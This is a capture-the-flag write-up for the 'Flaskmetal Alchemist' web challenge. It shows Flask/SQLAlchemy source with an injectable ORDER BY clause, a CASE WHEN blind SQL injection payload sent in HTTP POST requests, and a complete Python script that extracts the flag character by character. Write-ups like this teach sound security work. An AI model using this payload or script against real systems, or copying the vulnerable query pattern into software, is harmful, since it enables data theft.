# Flaskmetal Alchemist
**Category: Web**

This site is a tool that lets you filter elements.

<img src="site.png" width="50%">

The source was provided:

### `database.py`

```python
from sqlalchemy import create_engine
from sqlalchemy.orm import scoped_session, sessionmaker
from sqlalchemy.ext.declarative import declarative_base

engine = create_engine("sqlite:////tmp/test.db")
db_session = scoped_session(
    sessionmaker(autocommit=False, autoflush=False, bind=engine)
)
Base = declarative_base()
Base.query = db_session.query_property()


def init_db():
    Base.metadata.create_all(bind=engine)
```

The takeaway here is that we are dealing with a `sqlite` database.

### `models.py`

```python
from database import Base
from sqlalchemy import Column, Integer, String


class Metal(Base):
    __tablename__ = "metals"
    atomic_number = Column(Integer, primary_key=True)
    symbol = Column(String(3), unique=True, nullable=False)
    name = Column(String(40), unique=True, nullable=False)

    def __init__(self, atomic_number=None, symbol=None, name=None):
        self.atomic_number = atomic_number
        self.symbol = symbol
        self.name = name


class Flag(Base):
    __tablename__ = "flag"
    flag = Column(String(40), primary_key=True)

    def __init__(self, flag=None):
        self.flag = flag
```

Here we see that we have a `metals` table with a column for `atomic_number`, `symbol`, and `name`, and a `flag` table with a column for a `flag` value.

### `app.py`

```python
from flask import Flask, render_template, request, url_for, redirect
from models import Metal
from database import db_session, init_db
from seed import seed_db
from sqlalchemy import text

app = Flask(__name__)
app.config["TEMPLATES_AUTO_RELOAD"] = True
app.config['TESTING'] = True

@app.teardown_appcontext
def shutdown_session(exception=None):
    db_session.remove()


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        search = ""
        order = None
        if "search" in request.form:
            search = request.form["search"]
        if "order" in request.form:
            order = request.form["order"]
        if order is None:
            metals = Metal.query.filter(Metal.name.like("%{}%".format(search)))
        else:
            metals = Metal.query.filter(
                Metal.name.like("%{}%".format(search))
            ).order_by(text(order))
        return render_template("home.html", metals=metals)
    else:
        metals = Metal.query.all()
        return render_template("home.html", metals=metals)


if __name__ == "__main__":
    seed_db()
    app.run(debug=True)
```

The part to focus on is the query that executes when sending your parameters in a `POST` operation:

```python
metals = Metal.query.filter(
    Metal.name.like("%{}%".format(search))
).order_by(text(order))
```

The `like` function is protected against injection, but the `order_by` is not. The query will expand to look like:

```sql
SELECT metals.atomic_number AS metals_atomic_number, metals.symbol AS metals_symbol, metals.name AS metals_name
FROM metals
WHERE metals.name LIKE ? ORDER BY <Injection Point>
```

We can perform a blind SQL injection by changing the sort order if a condition is met. Let's craft a SQL payload for the `ORDER BY` to test this with the first character of the flag. (We know the flag format is `flag{...}`, which means we can test with `f`.) If this works, we will be able to extract the entire flag one character at a time.

```sql
CASE
WHEN (SELECT SUBSTR(flag,1,1) FROM flag)='f'
  THEN atomic_number 
ELSE 
  symbol 
END
```

Sent as a `POST`:

```http
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 98

search=&order=CASE+WHEN+(SELECT+SUBSTR(flag,1,1)+FROM+flag)='f'+THEN+atomic_number+ELSE+symbol+END
```
```html
...
<tr>
    <td style="width:20%">3</td>
    <td style="width:10%">Li</td>
    <td>Lithium</td>
</tr>

<tr>
    <td style="width:20%">4</td>
    <td style="width:10%">Be</td>
    <td>Beryllium</td>
</tr>

<tr>
    <td style="width:20%">11</td>
    <td style="width:10%">Na</td>
    <td>Sodium</td>
</tr>
...
```

The data was sorted by the atomic number, as we expected. We can test with an incorrect character at the same index to confirm that this exploit will work:

```http
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 98

search=&order=CASE+WHEN+(SELECT+SUBSTR(flag,1,1)+FROM+flag)='Z'+THEN+atomic_number+ELSE+symbol+END
```

```html
...
<tr>
    <td style="width:20%">89</td>
    <td style="width:10%">Ac</td>
    <td>Actinium</td>
</tr>

<tr>
    <td style="width:20%">47</td>
    <td style="width:10%">Ag</td>
    <td>Silver</td>
</tr>

<tr>
    <td style="width:20%">13</td>
    <td style="width:10%">Al</td>
    <td>Aluminum</td>
</tr>
...
```

This time, the sort was by the `symbol`, which proves our injection worked properly. The next thing to do is to write a script to pull all the flag characters:

```python
#!/usr/bin/env python3

from requests import post
from string import ascii_lowercase

URL = 'http://challenge.nahamcon.com:30702'
ALPHABET = ascii_lowercase + '{}_'
INJECTION = "CASE WHEN (SELECT SUBSTR(flag,{},1) FROM flag)='{}' THEN atomic_number ELSE symbol END"

flag = ''
index = 1
while True:
    for char in ALPHABET:
        response = post(URL, data={ 'search': '', 'order': INJECTION.format(index, char) })
        # The first atomic symbol appears on index 74 of the response (split by newlines).
        # If that is Li (which has an atomic number of 3), then we sorted by atomic number.
        first_atomic_symbol = response.text.split('\n')[74]
        if 'Li' in first_atomic_symbol:
            flag += char
            index += 1
            break
    print(flag)
    if flag[-1] == '}':
        break
```

```
$ ./exploit.py
f
fl
fla
flag
flag{
flag{o
flag{or
flag{ord
flag{orde
flag{order
flag{order_
flag{order_b
flag{order_by
flag{order_by_
flag{order_by_b
flag{order_by_bl
flag{order_by_bli
flag{order_by_blin
flag{order_by_blind
flag{order_by_blind}
```
